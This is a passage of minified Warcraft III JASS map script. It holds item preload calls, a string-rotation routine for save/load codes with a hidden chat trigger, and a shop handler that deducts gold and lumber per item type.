call jn($49303943)
call jn($49303944)
call jn($49303539)
call jn($49303543)
call jn($49303545)
call jn($49303942)
call jn($49303544)
call jn($49303938)
call jn($49303541)
call jn($4930334C)
call jn($4930334B)
call jn($49303537)
call jn($49303350)
call jn($49303538)
call jn($49303941)
call jn($49303937)
call jn($49303536)
call jn($49303542)
call jn($49303546)
call jn($4930334D)
call jn($49303353)
call jn($49303352)
call jn($4930334F)
call jn($49303355)
call jn($49303939)
call jn($49303351)
call jn($4930334E)
call jn($49303354)
call jn($49303549)
call jn($49303548)
call jn($49303547)
call jn($62737064)
call jn($6F646566)
call jn($6576746C)
call jn($70727674)
call jn($6C676468)
call jn($72616731)
call jn($61666163)
call jn($6B70696E)
call jn($63727973)
call jn($616A656E)
call jn($77737764)
call jn($77687764)
call jn($776F6D73)
call jn($706E7675)
call jn($66677267)
call jn($72656A33)
call jn($686C7374)
call jn($706F6D6E)
call jn($776C7364)
call jn($77736873)
call jn($77637963)
call jn($77696C6C)
call jn($49303751)
call jn($6D6E7374)
call jn($49303359)
call jn($49303551)
call jn($49303752)
call jn($49303358)
call jn($4930354E)
call jn($4930354D)
call jn($49303552)
call jn($6667736B)
call jn($73686172)
call jn($66676668)
call jn($73726573)
call jn($73727263)
call jn($696E6673)
call jn($616E6B68)
call jn($73616E64)
call jn($73726F72)
call jn($66676467)
call jn($746F7477)
call jn($70676865)
call jn($70726573)
call jn($70676D61)
call jn($70646976)
call jn($66677264)
call jn($6C6D6272)
call jn($676F6D6E)
call jn($67666F72)
call jn($67757669)
call jn($74706F77)
call jn($74646578)
call jn($74647832)
call jn($74696E32)
call jn($74657870)
call jn($74737472)
call jn($74737432)
call jn($6D616E68)
call jn($72726531)
call jn($4930414F)
call jn($4930414D)
call jn($4930414E)
call jn($49303636)
call jn($49304155)
call jn($49304153)
call jn($49304151)
call jn($49304154)
call jn($49304156)
call jn($49304152)
call jn($49304150)
call jn($6876616C)
call jn($72646973)
call jn($72737064)
call jn($72776174)
call jn($7273706C)
call jn($72726532)
call jn($72686533)
call jn($726D6132)
call jn($72686531)
call jn($72726573)
call jn($72737073)
call jn($72686532)
call jn($726D616E)
call jn($72726562)
call jn($72617466)
call jn($746B6E6F)
call jn($64657363)
call jn($72646534)
call jn($636B6E67)
call jn($6D6F6474)
call jn($6F66726F)
call jn($736E6567)
call jn($706D616E)
call jn($70696E76)
call jn($70636C72)
call jn($74736374)
call jn($74636173)
call jn($6D6F6F6E)
call jn($73696C6B)
call jn($70686561)
call jn($7373616E)
call jn($68736C76)
call jn($73747770)
call jn($7370726F)
call jn($73686561)
call jn($736D616E)
call jn($73726567)
call jn($73686173)
call jn($74677268)
call jn($74726574)
call jn($776E6567)
call jn($726E6563)
call jn($6D637269)
call jn($736B756C)
call jn($76616D70)
call jn($706C636C)
call jn($776F6C67)
call jn($6D67746B)
call jn($646B6677)
call jn($6D6F7274)
call jn($676F6C64)
call jn($49304352)
call jn($49304338)
call jn($49304341)
call jn($49304343)
call jn($49304337)
call jn($49304351)
call jn($49304350)
call jn($4930434F)
call jn($49304339)
call jn($49304336)
call jn($49304342)
call jn($4930434D)
call jn($4930434C)
call jn($4930434E)
call jn($49304248)
call jn($49304331)
call jn($49304330)
call jn($49304232)
call jn($49304235)
call jn($4930424B)
call jn($49304244)
call jn($49304258)
call jn($49304257)
call jn($49304237)
call jn($49304236)
call jn($49304234)
call jn($49304233)
call jn($49304230)
call jn($49304239)
call jn($49303130)
call jn($4930305A)
call jn($49303053)
call jn($49303051)
call jn($4930395A)
call jn($49304252)
call jn($49304251)
call jn($4930425A)
call jn($49304259)
call jn($49304150)
call jn($49304246)
call jn($49304333)
call jn($49304332)
call jn($49304157)
call jn($4930424A)
call jn($49304254)
call jn($49304253)
call jn($4930434B)
call jn($49304231)
call jn($49304255)
call jn($49304256)
call jn($49304245)
call jn($4930424F)
call jn($49304250)
call jn($4930415A)
call jn($49304345)
call jn($49304349)
call jn($49304346)
call jn($4930434A)
call jn($49304347)
call jn($49304348)
call jn($49303737)
call jn($49304334)
call jn($49304335)
call jn($49304247)
call jn($4930424D)
call jn($4930424E)
call jn($49304249)
call jn($49304159)
call jn($49303748)
call jn($49304241)
call jn($49304242)
call jn($49304243)
call jn($49304437)
call jn($49304438)
call jn($49304439)
call jn($49304441)
call jn($4930424C)
call jn($49304358)
call jn($49304442)
call jn($49304446)
call jn($49304445)
call jn($49304458)
call jn($49304457)
call jn($49304353)
call jn($49304431)
call jn($49304448)
call jn($49304447)
call jn($4930445A)
call jn($49304459)
call jn($49304355)
call jn($49304432)
call jn($4930444A)
call jn($49304449)
call jn($49304531)
call jn($49304530)
call jn($49304359)
call jn($49304444)
call jn($4930444C)
call jn($4930444B)
call jn($49304533)
call jn($49304532)
call jn($49304430)
call jn($49304435)
call jn($4930444E)
call jn($4930444D)
call jn($49304535)
call jn($49304534)
call jn($4930435A)
call jn($49304434)
call jn($49304450)
call jn($4930444F)
call jn($49304537)
call jn($49304536)
call jn($49304354)
call jn($49304436)
call jn($49304452)
call jn($49304451)
call jn($49304539)
call jn($49304538)
call jn($49304356)
call jn($49304433)
call jn($49304454)
call jn($49304453)
call jn($49304542)
call jn($49304541)
call jn($49304357)
call jn($49304443)
call jn($49304456)
call jn($49304455)
call jn($49304544)
call jn($49304543)
call jn($49304158)
call jn($49304545)
call jn($49304546)
call jn($49304547)
call jn($49304548)
call jn($49304549)
call jn($4930454A)
call jn($4930454B)
call jn($4930454C)
call jn($4930454D)
call jn($4930454E)
call jn($4930474B)
call jn($49304750)
call jn($49304751)
call jn($4930474C)
call jn($49304755)
call jn($49304754)
call jn($49304756)
call jn($49304758)
call jn($4930474F)
call jn($49304757)
call jn($49304832)
call jn($49304830)
call jn($49304759)
call jn($4930475A)
call jn($49304831)
call jn($49304458)
call jn($49304457)
call jn($49304633)
call jn($49304457)
call jn($4930464C)
call jn($49304643)
call jn($49304741)
call jn($49304659)
call jn($4930445A)
call jn($49304459)
call jn($4930464D)
call jn($49304644)
call jn($49304742)
call jn($4930465A)
call jn($49304531)
call jn($49304530)
call jn($4930464E)
call jn($49304645)
call jn($49304743)
call jn($49304730)
call jn($49304737)
call jn($49304658)
call jn($49304533)
call jn($49304532)
call jn($4930464F)
call jn($49304646)
call jn($49304744)
call jn($49304731)
call jn($49304535)
call jn($49304534)
call jn($49304650)
call jn($49304647)
call jn($49304745)
call jn($49304732)
call jn($49304537)
call jn($49304536)
call jn($49304651)
call jn($49304648)
call jn($49304746)
call jn($49304733)
call jn($49304657)
call jn($49304539)
call jn($49304538)
call jn($49304652)
call jn($49304649)
call jn($49304747)
call jn($49304734)
call jn($49304542)
call jn($49304541)
call jn($49304653)
call jn($4930464A)
call jn($49304748)
call jn($49304735)
call jn($49304544)
call jn($49304543)
call jn($49304654)
call jn($4930464B)
call jn($49304749)
call jn($49304736)
call jn($49304249)
call jn($49304159)
call jn($49304656)
call jn($49303646)
call jn($4930454F)
call jn($49304655)
call jn($4930474D)
call jn($4930474E)
call jn($49304738)
call jn($49304551)
call jn($49304552)
call jn($49304553)
call jn($49304550)
call jn($49304953)
call jn($49304954)
call jn($49304955)
call jn($49304956)
call jn($4930494F)
call jn($49304950)
call jn($4930494D)
call jn($4930494E)
call jn($49304951)
call jn($49304952)
call jn($49304948)
call jn($4930494B)
call jn($49304949)
call jn($4930494C)
call jn($49304947)
call jn($4930494A)
call jn($49304849)
call jn($4930484A)
call jn($4930484B)
call jn($4930484C)
call jn($4930484D)
call jn($4930484E)
call jn($4930484F)
call jn($49304939)
call jn($49304937)
call jn($49304938)
call jn($49304853)
call jn($49304854)
call jn($49304855)
call jn($49304943)
call jn($49304944)
call jn($49304942)
call jn($49304945)
call jn($49304941)
call jn($49304946)
call jn($49304856)
call jn($49304857)
call jn($49304852)
call jn($49304931)
call jn($49304932)
call jn($49304933)
call jn($49304934)
call jn($49303650)
call jn($49304936)
call jn($49304858)
call jn($49304859)
call jn($49304851)
call jn($49304836)
call jn($49304838)
call jn($49304837)
call jn($49304835)
call jn($49304930)
call jn($49304850)
call jn($49304957)
call jn($4930485A)
call jn($49304739)
call jn($49304A32)
call jn($49304A33)
call jn($49304A34)
call jn($49304A35)
call jn($49304A36)
call jn($49304A37)
call jn($49304A38)
call jn($49304A39)
call jn($49304A41)
call jn($49304A42)
call jn($49304A43)
call jn($49304A44)
call jn($49304A4F)
call jn($49304A56)
call jn($49304B38)
call jn($49304A57)
call jn($49304B39)
call jn($49304A58)
call jn($49304B43)
call jn($49304A59)
call jn($49304B44)
call jn($49304A5A)
call jn($49304B30)
call jn($49304B31)
call jn($49304B32)
call jn($49304B33)
call jn($49304B34)
call jn($49304B35)
call jn($49304B36)
call jn($49304B41)
call jn($49304B37)
call jn($49304B45)
call jn($49304B42)
call jn($49304A52)
call jn($49304B46)
call jn($49304B47)
call jn($49304B54)
call jn($49304B55)
call jn($49304B52)
call jn($49304B53)
call jn($49304B4E)
call jn($49304B4F)
call jn($49304B48)
call jn($49304B4A)
call jn($49304B49)
call jn($49304B50)
call jn($49304B4C)
call jn($49304B4B)
call jn($49304B4D)
call jn($49304B51)
call jn($49304B56)
call jn($49304C41)
call jn($49304C38)
call jn($49304C43)
call jn($49304C37)
call jn($49304C42)
call jn($49304C39)
call jn($49304C36)
call jn($49304C32)
call jn($49304C33)
call jn($49304C34)
call jn($49304C35)
call jn($49304C46)
call jn($49304C47)
call jn($49304C48)
call jn($49304C49)
call jn($49304C4A)
call jn($49304C4B)
call jn($49304C4D)
call jn($49304C4C)
call jn($49304D48)
call jn($49304D49)
call jn($49304D4A)
call jn($49304D4B)
call jn($49304D4C)
call jn($49304D4D)
call jn($49304D4E)
call jn($49304D4F)
call jn($49304D51)
call jn($49304D52)
call jn($49304D53)
call jn($49304D54)
call jn($49304D55)
call jn($49304D56)
call jn($49304D57)
call jn($49304D58)
call jn($49304D59)
call jn($49304D5A)
call jn($49304E30)
call jn($49304E31)
call jn($49304E32)
call jn($49304E33)
call jn($49304E34)
call jn($49304E35)
call jn($49304E36)
call jn($49304E37)
call jn($49304E38)
call jn($49304E39)
call jn($49304E41)
call jn($49304E42)
call jn($49304D47)
call jn($49303049)
call jn($4930304C)
call jn($49304E45)
call jn($49304739)
call jn($49304E43)
call jn($49304E44)
call jn($49304E46)
call jn($49304E47)
call jn($49304E48)
call jn($49304E4A)
call jn($49304E49)
call jn($49304E53)
call jn($49304E56)
call jn($49304E55)
call jn($49304E54)
call jn($49304E4E)
call jn($49304E51)
call jn($49304E58)
call jn($49304E4B)
call jn($49304E4C)
call jn($49304E4F)
call jn($49304E52)
call jn($49304E57)
call jn($49304E59)
call jn($49304E50)
call jn($49304E4D)
call jn($49304E5A)
call jn($49304F44)
call jn($49304F45)
call jn($49304F42)
call jn($49304F36)
call jn($49304F37)
call jn($49304F38)
call jn($49304F39)
call jn($49304F41)
call jn($49304F43)
call jn($49304F30)
call jn($49304F31)
call jn($49304F32)
call jn($49304F33)
call jn($49304F49)
call jn($49304F48)
call jn($49304F34)
call jn($49304F35)
call jn($49304F46)
call jn($49304F47)
call jn($49304F4B)
call jn($49304F4C)
call jn($49304F53)
call jn($49304F54)
call jn($49304F4D)
call jn($49304F4E)
call jn($49304F4F)
call jn($49304F50)
call jn($49304F56)
call jn($49304F55)
call jn($49304F51)
call jn($49304F52)
call jn($49304F58)
call jn($49304F57)
call jn($49304F59)
call jn($49304F5A)
call jn($49305030)
call jn($49305031)
call jn($49305032)
call jn($49305033)
call jn($49305034)
call jn($49305035)
call jn($49305036)
call jn($49305037)
call jn($49305038)
call jn($49305039)
call jn($49305041)
call jn($49305042)
call jn($49305043)
call jn($49305044)
call jn($49305045)
call jn($49305046)
call jn($49305047)
call jn($49305048)
call jn($49305049)
call jn($4930504A)
call jn($49305056)
call jn($49305055)
call jn($49305057)
call jn($49305058)
call jn($4930505A)
call jn($49305059)
call jn($49305131)
call jn($49305130)
call jn($49305132)
call jn($49305133)
call jn($49305138)
call jn($49305139)
call jn($49305141)
call jn($49305142)
call jn($49305143)
call jn($49305144)
call jn($49305134)
call jn($49305135)
call jn($49305136)
call jn($49305137)
call jn($49305145)
call jn($49305146)
call jn($49305147)
call jn($49305148)
call jn($49305149)
call jn($4930514A)
call jn($4930514B)
call jn($4930514D)
call jn($4930514C)
call jn($4930514F)
call jn($49305152)
call jn($49305153)
call jn($49305154)
call jn($49305155)
call jn($49305156)
call jn($49305157)
call jn($49305158)
call jn($49305159)
call jn($4930515A)
call jn($49305230)
call jn($49305231)
call jn($49305232)
call jn($49305233)
call jn($49305234)
call jn($49305235)
call jn($49305239)
call jn($49305238)
call jn($49305246)
call jn($49305243)
call jn($49305244)
call jn($49305241)
call jn($49305242)
call jn($49305245)
call jn($49305247)
call jn($49305248)
call jn($656E6773)
call jn($73687764)
call jn($49305249)
call jn($4930524C)
call jn($4930524A)
call jn($4930524B)
call jn($49304256)
call jn($49305252)
call jn($4930524E)
call jn($49305251)
call jn($49305250)
call jn($4930524F)
call jn($49305256)
call jn($49305257)
call jn($49305258)
call jn($49305259)
call jn($4930525A)
call jn($49305330)
call jn($49305331)
call jn($49305332)
call jn($49305333)
call jn($49305334)
call jn($49305335)
call jn($49305336)
call jn($49305337)
call jn($49305338)
call jn($49305339)
call jn($49305341)
call jn($49305342)
call jn($49305343)
call jn($49305344)
call jn($49305347)
call jn($49305346)
call jn($49305345)
call jn($4930534A)
call jn($49305349)
call jn($4930534D)
call jn($4930534C)
call jn($4930534B)
call jn($4930534F)
call jn($4930534E)
call jn($49305350)
call jn($49305351)
call jn($49305352)
call jn($49305353)
call jn($4930535A)
call jn($49305430)
call jn($49305355)
call jn($49305354)
call jn($49305431)
call jn($49305432)
call jn($49305359)
call jn($49305358)
call jn($49305356)
call jn($49305357)
call jn($49305433)
call jn($49305434)
call jn($49305435)
call jn($49305436)
call jn($49305437)
call jn($49305438)
call jn($49305439)
call jn($676F7072)
call jn($6B336D33)
call jn($6B796768)
call jn($64746862)
call jn($736B7274)
call jn($6B79626C)
call jn($6B796D6E)
call jn($6B336D31)
call jn($77746C67)
call jn($70686C74)
call jn($736F7266)
call jn($49305441)
call jn($49305442)
call jn($49305443)
call jn($49305444)
call jn($49305445)
call jn($49305446)
call jn($49305447)
call jn($49305448)
call jn($49305449)
call jn($676D6672)
call jn($4930544A)
call jn($4930544E)
call jn($4930544C)
call jn($4930544D)
call jn($4930544B)
call jn($49305532)
call jn($49305533)
call jn($49305534)
call jn($49305535)
call jn($49305536)
call jn($49305537)
call jn($49305538)
call jn($49305539)
call jn($49305541)
call jn($49305542)
call jn($49305543)
call jn($49305544)
call jn($49305545)
call jn($49305546)
call jn($49305548)
call jn($49305547)
call jn($49305551)
call jn($49305552)
call jn($49305554)
call jn($49305553)
call jn($4930554F)
call jn($49305550)
call jn($49304A51)
call jn($49303257)
call jn($49303251)
call jn($49303253)
call jn($49303858)
call jn($49303255)
call jn($4930344F)
call jn($49305531)
call jn($49303859)
call jn($49304A50)
call jn($49303254)
call jn($49303256)
call jn($49303450)
call jn($49303258)
call jn($49305638)
call jn($49305639)
call jn($49305630)
call jn($49305631)
call jn($49305632)
call jn($49305633)
call jn($49305634)
call jn($49305635)
call jn($49305636)
call jn($49305637)
call jn($4930555A)
call jn($49305559)
call jn($49305555)
call jn($49305556)
call jn($49305557)
call jn($49305558)
call jn($63686573)
call jn($6A706E74)
call jn($627A6266)
call jn($627A6265)
call jn($636E686E)
call jn($73636C70)
call jn($617A6872)
call jn($6B79736E)
call jn($6B74726D)
call jn($4930564A)
call jn($4930564B)
call jn($49305651)
call jn($49305650)
call jn($4930564F)
call jn($4930564E)
call jn($49305656)
call jn($49305653)
call jn($49305654)
call jn($49305655)
call jn($49305658)
call jn($49305659)
call jn($49305657)
call jn($49305656)
call jn($4930565A)
call jn($49305734)
call jn($49305734)
call jn($49305735)
call jn($49305736)
call jn($49305737)
call jn($49305738)
call jn($49305739)
call jn($49305734)
call jn($49305741)
call jn($49305742)
call jn($49305743)
call jn($49305744)
call jn($49305746)
call jn($49305745)
call jn($49305747)
call jn($49305748)
call jn($49305749)
call jn($4930574A)
call jn($4930574B)
call jn($4930574C)
call jn($4930574D)
call jn($4930574E)
call jn($4930574F)
call jn($49305750)
call jn($49305751)
call jn($49305752)
call jn($49305753)
call jn($706E766C)
call jn($6B336D32)
call jn($676C736B)
call jn($74686C65)
call jn($64706865)
call jn($616D7263)
call jn($70616D73)
call jn($61727368)
call jn($73747761)
call jn($72617433)
call jn($4930584C)
call jn($4930584D)
call jn($4930584A)
call jn($4930584B)
call jn($6B67616C)
call jn($62726167)
call jn($69776272)
call jn($656E766C)
call jn($676F626D)
call jn($74656C73)
call jn($7468646D)
call jn($7372746C)
call jn($626C6261)
call jn($616E6667)
call jn($736F756C)
call jn($6573617A)
call jn($7363686C)
call jn($726F7473)
call jn($73747067)
call jn($7368656E)
call jn($70737064)
call jn($736B7368)
call jn($666C6167)
call jn($4930584F)
call jn($49305850)
call jn($49305851)
call jn($49305852)
call jn($49305853)
call jn($49305854)
call jn($49305846)
call jn($49305855)
call jn($49305856)
call jn($49305857)
call jn($49305858)
call jn($49305859)
call jn($4930585A)
call jn($49305930)
call jn($49305956)
call jn($49305957)
call jn($49305958)
call jn($49305955)
call jn($49305941)
call jn($49305954)
call jn($4930595A)
call jn($49305959)
call jn($49305A30)
call jn($49305A31)
call jn($49305939)
call jn($49305A32)
call jn($49305A37)
call jn($49305A36)
call jn($49305A34)
call jn($49305A33)
call jn($49305938)
call jn($49305A35)
call jn($49305932)
call jn($49305933)
call jn($49305934)
call jn($49305935)
call jn($49305936)
call jn($49305931)
call jn($49305A38)
call jn($49305A39)
call jn($49305A41)
call jn($49305A42)
call jn($49305A43)
call jn($49305A44)
call jn($49305A45)
call jn($49305A46)
call jn($49305A47)
call jn($49305A48)
call jn($49305A49)
call jn($49305A4A)
call jn($49305A4B)
call jn($49305A4C)
call jn($49305A4D)
call jn($49305A50)
call jn($49305A4F)
call jn($49305A4E)
call jn($75666C67)
call jn($6E666C67)
call jn($6F666C67)
call jn($62747374)
call jn($7462736D)
call jn($746C756D)
call jn($49305A51)
call jn($49305A52)
call jn($4930594C)
call jn($49305947)
call jn($49305949)
call jn($49305946)
call jn($49305948)
call jn($4930594A)
call jn($4930594B)
call jn($4930594D)
call jn($4930594E)
call jn($49305942)
call jn($49305944)
call jn($4930594F)
call jn($49305950)
call jn($49305956)
call jn($49305957)
call jn($49305A5A)
call jn($49313030)
call jn($49305951)
call jn($49305952)
call jn($49305A59)
call jn($49305A58)
call jn($49313031)
call jn($49305937)
call jn($49305953)
call jn($49305945)
call jn($74666172)
call jn($64747362)
call jn($746D7363)
call jn($67656D74)
call jn($6173626C)
call jn($7462616B)
call jn($67736F75)
call jn($49313039)
call jn($49313038)
call jn($49304630)
call jn($49304642)
call jn($4930455A)
call jn($49304641)
call jn($49304631)
call jn($49304639)
call jn($49304559)
call jn($49304638)
call jn($49304558)
call jn($49304637)
call jn($49304632)
call jn($49304636)
call jn($49304557)
call jn($49304635)
call jn($49304556)
call jn($49304634)
call jn($49304555)
call jn($49304633)
call jn($74626172)
call jn($49313049)
call jn($4931304A)
call jn($4931304C)
call jn($4931304B)
call jn($4931304D)
call jn($4931304E)
call jn($4931304F)
call jn($49313050)
call jn($49304752)
call jn($49305A56)
call jn($49305A57)
call jn($49304A54)
call jn($6772736C)
call jn($73626F6B)
call jn($73686377)
call jn($72616D34)
call jn($49305050)
call jn($4930554A)
call jn($49305053)
call jn($49313051)
call jn($49304C5A)
call jn($49304D34)
call jn($49305348)
call jn($49304C58)
call jn($49304554)
call jn($49304D37)
call jn($49304834)
call jn($49304D35)
call jn($49305054)
call jn($49304D38)
call jn($49305847)
call jn($49304C59)
call jn($49303048)
call jn($49304958)
call jn($49313054)
call jn($72646530)
call jn($6C6E726E)
call jn($726E7370)
call jn($6A64726E)
call jn($63726474)
call jn($6B6C6D6D)
call jn($7664646C)
call jn($66726764)
call jn($64727068)
call jn($6D6C7374)
call jn($73726264)
call jn($6E737069)
call jn($72656A31)
call jn($49313148)
call jn($49313146)
call jn($49313144)
call jn($49313142)
call jn($49313139)
call jn($49313137)
call jn($49313135)
call jn($49313133)
call jn($49313131)
call jn($4931305A)
call jn($49313058)
call jn($49313056)
call jn($49313147)
call jn($49313145)
call jn($49313143)
call jn($49313141)
call jn($49313138)
call jn($49313136)
call jn($49313134)
call jn($49313132)
call jn($49313130)
call jn($49313059)
call jn($49313057)
call jn($49313055)
call jn($6667756E)
call jn($4930504F)
call jn($49305051)
call jn($49305052)
call jn($73747265)
call jn($6C757265)
call jn($72756D70)
call jn($73666F67)
call jn($73707265)
call jn($49305453)
call jn($6D6E7366)
call jn($61786173)
call jn($49313150)
call jn($49313154)
call jn($49313152)
call jn($49313157)
call jn($49313156)
call jn($49313153)
call jn($49313155)
call jn($4931314C)
call jn($49313151)
call jn($4931314D)
call jn($4931314E)
call jn($4931314F)
call jn($49313158)
endfunction
function jw takes nothing returns nothing
call jt()
call jv()
call ju()
endfunction
function jx takes string M6,integer L9 returns string
return SubString(M6,L9,L9+1)
endfunction
function jy takes integer M2 returns nothing
local string M5=""
local integer M4=StringLength(M3)
local integer L9=0
loop
exitwhen not (L9+M2<M4)
set M5=M5+jx(M3,L9+M2)
set L9=L9+1
endloop
loop
exitwhen not (L9<M4)
set M5=M5+jx(M3,L9+M2-M4)
set L9=L9+1
endloop
set M3=M5
endfunction
function jz takes nothing returns nothing
set M1=2
call BJDebugMsg("11")
call jy(M1)
endfunction
function j0 takes integer MD,integer ME returns integer
return MD-ME*(MD/ME)
endfunction
function j1 takes string M6 returns integer
local integer L9=0
local integer M4=StringLength(M3)
loop
exitwhen not (L9<M4)
if M6==jx(M3,L9) then
return L9
endif
set L9=L9+1
endloop
return L9
endfunction
function j2 takes integer MD,integer Od,string Na returns string
local integer L9=0
local string Of=""
local integer Oe=StringLength(Na)
loop
exitwhen not (L9<Od)
set L9=L9+1
set Of=Of+jx(Na,j0(MD,Oe))
set MD=MD/Oe
endloop
return Of
endfunction
function j3 takes integer MD,integer Od returns string
return j2(MD,Od,M3)
endfunction
function j4 takes string MD,string Na returns integer
local integer L9=0
local integer Of=0
local integer Oy=1
local integer Oe=StringLength(Na)
loop
exitwhen not (L9<StringLength(MD))
set Of=Of+Oy*j1(jx(MD,L9))
set Oy=Oy*Oe
set L9=L9+1
endloop
return Of
endfunction
function j5 takes string MD returns integer
return j4(MD,M3)
endfunction
function j6 takes nothing returns nothing
local trigger Hc
if GetUnitState(KR,UNIT_STATE_LIFE)>225 then
set M1=11
call jy(M1)
else
call jy(M1)
endif
set Hc=CreateTrigger()
call TriggerRegisterPlayerChatEvent(Hc,Player(0),"-1232132132321321",false)
call TriggerAddAction(Hc,function jz)
set Hc=null
endfunction
function kC takes nothing returns nothing
local integer L9=0
loop
exitwhen L9==8192 or M8[L9]==null
if TriggerEvaluate(M8[L9]) then
call TriggerExecute(M8[L9])
endif
set L9=L9+1
endloop
endfunction
function kD takes nothing returns nothing
local integer L9=0
loop
exitwhen L9==8192 or NB[L9]==null
if TriggerEvaluate(NB[L9]) then
call TriggerExecute(NB[L9])
endif
set L9=L9+1
endloop
endfunction
function kE takes nothing returns nothing
call TriggerAddAction(M7,function kC)
call TriggerAddAction(M9,function kD)
endfunction
function kF takes unit Hu,item MO,integer NG,integer NH,integer NI returns nothing
if GetItemTypeId(MO)==NG then
call SetItemUserData(MO,GetPlayerId(GetOwningPlayer(Hu))+1)
if NH>0 then
set NJ[GetPlayerId(GetOwningPlayer(Hu))+1]=NJ[GetPlayerId(GetOwningPlayer(Hu))+1]-NH
endif
if NI>0 then
set NK[GetPlayerId(GetOwningPlayer(Hu))+1]=NK[GetPlayerId(GetOwningPlayer(Hu))+1]-NI
endif
endif
endfunction
function kG takes nothing returns nothing
local unit Hu=GetBuyingUnit()
local unit NE=GetTriggerUnit()
local item MO=GetSoldItem()
local location Ht
set NF=false
call SetItemUserData(MO,GetPlayerId(GetOwningPlayer(GetBuyingUnit()))+1)
if GetItemTypeId(MO)==$49305733 then
call CreateUnitAtLoc(GetOwningPlayer(Hu),$68646573,Location(5809,3450),0)
endif
call kF(Hu,MO,$49305733,30000,0)
call kF(Hu,MO,$4930584E,150000,6000)
call kF(Hu,MO,$4930375A,300000,0)
call kF(Hu,MO,$49305535,0,6000)
call kF(Hu,MO,$49305533,0,6000)
call kF(Hu,MO,$49305539,0,6000)
call kF(Hu,MO,$49305537,0,6000)
call kF(Hu,MO,$49305542,0,6000)
call kF(Hu,MO,$49305546,0,6000)
call kF(Hu,MO,$49305548,0,6000)
call kF(Hu,MO,$49305547,0,6000)
call kF(Hu,MO,$49305630,0,6000)
call kF(Hu,MO,$49305632,0,6000)
call kF(Hu,MO,$49305636,0,6000)
call kF(Hu,MO,$49305634,0,6000)
call kF(Hu,MO,$49305559,0,6000)
call kF(Hu,MO,$49305556,0,6000)
call kF(Hu,MO,$49305557,0,6000)
call kF(Hu,MO,$49305A45,0,6000)
call kF(Hu,MO,$49304E45,0,6000)
call kF(Hu,MO,$49304D50,0,6000)
call kF(Hu,MO,$4930375A,0,6000)
call kF(Hu,MO,$49305944,0,6000)
call kF(Hu,MO,$49305950,0,6000)
call kF(Hu,MO,$49305A57,0,6000)
call kF(Hu,MO,$49305A5A,0,6000)
call kF(Hu,MO,$49305952,0,6000)
call kF(Hu,MO,$49305A58,0,6000)
call kF(Hu,MO,$49305937,0,6000)
call kF(Hu,MO,$49305945,0,6000)
call kF(Hu,MO,$4930594E,0,6000)
call kF(Hu,MO,$4930594B,0,6000)
call kF(Hu,MO,$49305949,0,6000)
call kF(Hu,MO,$49305948,0,6000)
call kF(Hu,MO,$4930594C,0,6000)
call kF(Hu,MO,$49304E56,2400,30)
call kF(Hu,MO,$49304E54,2400,30)
call kF(Hu,MO,$49304E58,2400,30)
call kF(Hu,MO,$49304E57,2400,30)
call kF(Hu,MO,$49304E59,2400,30)
call kF(Hu,MO,$49304836,0,1500)
call kF(Hu,MO,$49304838,0,1500)
call kF(Hu,MO,$49304837,0,1500)
call kF(Hu,MO,$49304835,0,1500)
call kF(Hu,MO,$49304F58,0,1500)
call kF(Hu,MO,$49304F57,0,1500)
call kF(Hu,MO,$49304955,0,1500)
call kF(Hu,MO,$49304956,0,1500)
call kF(Hu,MO,$49304833,0,1500)
call kF(Hu,MO,$49303458,0,1500)
call kF(Hu,MO,$49303453,0,1500)
call kF(Hu,MO,$4930324B,0,1500)
call kF(Hu,MO,$49303154,0,1500)
call kF(Hu,MO,$49304950,48000,1200)
call kF(Hu,MO,$4930494E,48000,1200)
call kF(Hu,MO,$49304946,48000,1200)
call kF(Hu,MO,$49304945,48000,1200)
call kF(Hu,MO,$49305030,48000,1200)
call kF(Hu,MO,$49304B47,48000,1200)
call kF(Hu,MO,$49305049,48000,1200)
call kF(Hu,MO,$49305032,48000,1200)
call kF(Hu,MO,$49305036,48000,1200)
call kF(Hu,MO,$49305034,48000,1200)
call kF(Hu,MO,$49305242,48000,1200)
call kF(Hu,MO,$49305246,48000,1200)
call kF(Hu,MO,$726F7473,48000,1200)
call kF(Hu,MO,$70737064,48000,1200)
call kF(Hu,MO,$73747067,48000,1200)
call kF(Hu,MO,$736B7368,48000,1200)
call kF(Hu,MO,$49305244,48000,1200)
call kF(Hu,MO,$49305047,48000,1200)
call kF(Hu,MO,$7368656E,48000,1200)
call kF(Hu,MO,$49305045,48000,1200)
call kF(Hu,MO,$49304932,48000,1200)
call kF(Hu,MO,$4930434F,48000,1200)
call kF(Hu,MO,$666C6167,48000,1200)
call kF(Hu,MO,$49304350,48000,1200)
call kF(Hu,MO,$49304351,48000,1200)
call kF(Hu,MO,$49304934,48000,1200)
call kF(Hu,MO,$49304936,48000,1200)
call kF(Hu,MO,$49304938,48000,1200)
call kF(Hu,MO,$49304952,48000,1200)
call kF(Hu,MO,$49304944,48000,1200)
call kF(Hu,MO,$4931304B,48000,1200)
call kF(Hu,MO,$4931304A,48000,1200)
call kF(Hu,MO,$49304849,6000,90)
call kF(Hu,MO,$49305145,6000,90)
call kF(Hu,MO,$49304C46,6000,90)
call kF(Hu,MO,$49304548,6000,90)
call kF(Hu,MO,$49303558,6000,90)
call kF(Hu,MO,$4930364C,6000,90)
call kF(Hu,MO,$4930354C,6000,90)
call kF(Hu,MO,$746B6E6F,6000,90)
call kF(Hu,MO,$4930364B,6000,90)
call kF(Hu,MO,$4930364D,6000,90)
call kF(Hu,MO,$4930364F,6000,90)
call kF(Hu,MO,$49304A37,6000,90)
call kF(Hu,MO,$49305A47,6000,90)
call kF(Hu,MO,$49304D48,6000,90)
call kF(Hu,MO,$49304F42,6000,90)
call kF(Hu,MO,$49303649,6000,90)
call kF(Hu,MO,$49304F31,6000,90)
call kF(Hu,MO,$49304F33,6000,90)
call kF(Hu,MO,$49304F48,6000,90)
call kF(Hu,MO,$49304F35,6000,90)
call kF(Hu,MO,$73626368,6000,90)
call kF(Hu,MO,$74696E32,6000,90)
call kF(Hu,MO,$4930364A,6000,90)
call kF(Hu,MO,$706D6E61,6000,90)
call kF(Hu,MO,$77617264,6000,90)
call kF(Hu,MO,$6A706E74,6000,90)
call kF(Hu,MO,$4930304B,6000,90)
call kF(Hu,MO,$49304133,6000,90)
call kF(Hu,MO,$49303032,6000,90)
call kF(Hu,MO,$49304F47,6000,90)
call kF(Hu,MO,$72617436,6000,90)
call kF(Hu,MO,$49305441,6000,90)
call kF(Hu,MO,$61666163,6000,90)
call kF(Hu,MO,$49303733,6000,90)
call kF(Hu,MO,$49305932,6000,90)
call kF(Hu,MO,$706D616E,6000,90)
call kF(Hu,MO,$72646973,6000,90)
call kF(Hu,MO,$72686531,6000,90)
